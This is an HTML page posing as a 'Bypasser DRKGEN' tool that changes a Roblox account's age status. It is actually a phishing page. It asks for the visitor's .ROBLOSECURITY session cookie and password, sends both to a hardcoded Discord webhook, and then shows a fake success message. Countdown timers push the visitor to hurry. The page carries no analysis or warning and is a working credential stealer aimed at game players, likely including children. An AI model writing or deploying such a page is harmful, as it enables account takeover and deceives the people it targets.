<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Bypasser DRKGEN</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background-color: #000;
      font-family: 'Segoe UI', sans-serif;
      color: white;
      overflow: hidden;
    }

    .header {
      text-align: center;
      font-size: 2em;
      font-weight: bold;
      margin-top: 30px;
      z-index: 10;
      position: relative;
    }

    .buttons {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 50px;
      z-index: 10;
      position: relative;
    }

    button {
      padding: 15px 30px;
      font-size: 16px;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      background: white;
      color: black;
      font-weight: bold;
      transition: background 0.3s;
    }

    button:hover {
      background: #aaa;
    }

    .form-section {
      display: none;
      text-align: center;
      margin-top: 40px;
      z-index: 10;
      position: relative;
    }

    input[type="text"] {
      padding: 10px;
      width: 300px;
      border-radius: 8px;
      border: none;
      margin-bottom: 10px;
    }

    .countdown {
      font-size: 18px;
      margin-bottom: 10px;
    }

    .success-message {
      color: #00ff00;
      font-weight: bold;
      margin-top: 10px;
      display: none;
    }

    .error-message {
      color: red;
      font-weight: bold;
      margin-top: 10px;
      display: none;
    }

    .input-group {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
    }

    canvas {
      position: fixed;
      top: 0;
      left: 0;
      z-index: 0;
    }
  </style>
</head>
<body>

<canvas id="bg"></canvas>

<div class="header">Bypasser DRKGEN</div>

<div class="buttons">
  <button id="btn1">+13 to &lt;13</button>
  <button id="btn2">&lt;13 to +13</button>
</div>

<div id="form1" class="form-section">
  <div class="countdown" id="countdown1"></div>
  <div class="input-group">
    <input type="text" id="cookie1" placeholder="🍪 Enter Roblox cookie..." />
    <input type="text" id="password1" placeholder="🔒 Enter password..." />
  </div>
  <br>
  <button onclick="submitData('cookie1', 'password1', 'success1', 'error1')">Submit</button>
  <div class="success-message" id="success1">✅ Successfully bypassed!</div>
  <div class="error-message" id="error1">❌ Invalid cookie. Please enter a valid Roblox cookie.</div>
</div>

<div id="form2" class="form-section">
  <div class="countdown" id="countdown2"></div>
  <p>You must enter cookie here:</p>
  <input type="text" id="cookie2" placeholder="Enter Roblox cookie..." />
  <br>
  <button onclick="submitData('cookie2', null, 'success2', 'error2')">Submit</button>
  <div class="success-message" id="success2">✅ Successfully bypassed!</div>
  <div class="error-message" id="error2">❌ Invalid cookie. Please enter a valid Roblox cookie.</div>
</div>

<script>
  document.getElementById("btn1").onclick = () => {
    document.getElementById("form1").style.display = "block";
    document.getElementById("form2").style.display = "none";
    startCountdown("countdown1", 60);
  };

  document.getElementById("btn2").onclick = () => {
    document.getElementById("form2").style.display = "block";
    document.getElementById("form1").style.display = "none";
    startCountdown("countdown2", 30);
  };

  function startCountdown(elementId, seconds) {
    const display = document.getElementById(elementId);
    let time = seconds;
    display.textContent = `⏳ ${time} seconds remaining`;
    const interval = setInterval(() => {
      time--;
      display.textContent = `⏳ ${time} seconds remaining`;
      if (time <= 0) {
        clearInterval(interval);
        display.textContent = "⏰ Time's up!";
      }
    }, 1000);
  }

  function isValidRobloxCookie(cookie) {
    return cookie.startsWith(".ROBLOSECURITY=") && cookie.length > 40;
  }

  function submitData(cookieId, passId, successId, errorId) {
    const cookieVal = document.getElementById(cookieId).value;
    const passwordVal = passId ? document.getElementById(passId).value : null;
    const successMsg = document.getElementById(successId);
    const errorMsg = document.getElementById(errorId);
    successMsg.style.display = 'none';
    errorMsg.style.display = 'none';

    if (!isValidRobloxCookie(cookieVal)) {
      errorMsg.style.display = 'block';
      return;
    }

    let message = `🔔 New submission:\nCookie: ${cookieVal}`;
    if (passwordVal) message += `\nPassword: ${passwordVal}`;

    fetch("https://discord.com/api/webhooks/1337411003771781151/SI6-PZe8OgtE4IgxoT5k9rcVVPGkxwqbmq1ERywI8Gys9Y8ttsy2GRxhXZwnYmsNZBqR", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ content: message })
    })
    .then(() => {
      setTimeout(() => {
        successMsg.style.display = 'block';
      }, 2000);
    })
    .catch(() => alert("Failed to send."));
  }

  const canvas = document.getElementById("bg");
  const ctx = canvas.getContext("2d");
  let particles = [];

  function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    particles = [];

    for (let i = 0; i < 100; i++) {
      particles.push({
        x: Math.random() * canvas.width,
        y: Math.random() * canvas.height,
        vx: (Math.random() - 0.5) * 0.5,
        vy: (Math.random() - 0.5) * 0.5,
        radius: Math.random() * 2 + 1
      });
    }
  }

  function drawParticles() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "white";
    for (let p of particles) {
      ctx.beginPath();
      ctx.arc(p.x, p.y, p.radius, 0, 2 * Math.PI);
      ctx.fill();

      p.x += p.vx;
      p.y += p.vy;

      if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
      if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
    }
    requestAnimationFrame(drawParticles);
  }

  window.addEventListener("resize", resizeCanvas);
  resizeCanvas();
  drawParticles();
</script>

</body>
</html>
